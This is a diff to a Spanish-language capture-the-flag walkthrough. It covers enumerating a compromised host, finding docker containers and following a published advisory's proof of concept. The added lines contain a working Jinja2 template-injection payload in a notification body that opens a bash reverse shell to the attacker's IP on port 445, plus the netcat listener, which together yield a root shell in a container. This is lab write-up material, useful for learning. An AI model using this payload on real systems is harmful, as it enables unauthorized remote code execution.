@@ -97,7 +97,7 @@ Buscamos los puertos abiertos `ss -nltp` tampoco encontramos nada
 Buscamos en los procesos con `ps -faux` tampoco encontramos nada útil
 
 Al hacer `hostname -I` encontramos otra IP diferente, encontrando un docker instalado
-Para hacer un reconocimiento de las maquinas docker podemos hacer un codigo para identificar las IP que hay
+Para hacer un reconocimiento de las maquinas docker podemos hacer un código para identificar las IP que hay
 ```bash
 #!/bin/bash
 
@@ -133,5 +133,11 @@ Seguiremos el PoC `https://github.com/advisories/GHSA-4r7v-whpg-8rx3` lo primero
 Añadimos la url apuntando al servidor que hemos levantado 
 En edit cambiamos el timer a menos tiempo y en la zona de notifications añadimos:
 - Notification URL list `get://10.10.11.34:8882`
-- Notification body `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c').read() }}`
+- Notification body `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i /dev/tcp/<IP_Atacante>/445 0>&1"').read() }}`
+
+En nuestra maquina atacante nos ponemos en escucha `nc -nlvp 445` y realizamos cualquier cambio en el `index.html` para obtener la shell
+Hemos obtenido una shell como root dentro del contenedor  con IP `172.17.0.2:5000`  una vez obtenida la shell hacemos un tratamiento de esta
+
+Si navegamos por los directorios encontramos en la raíz un directorio `/datastore`
+
 
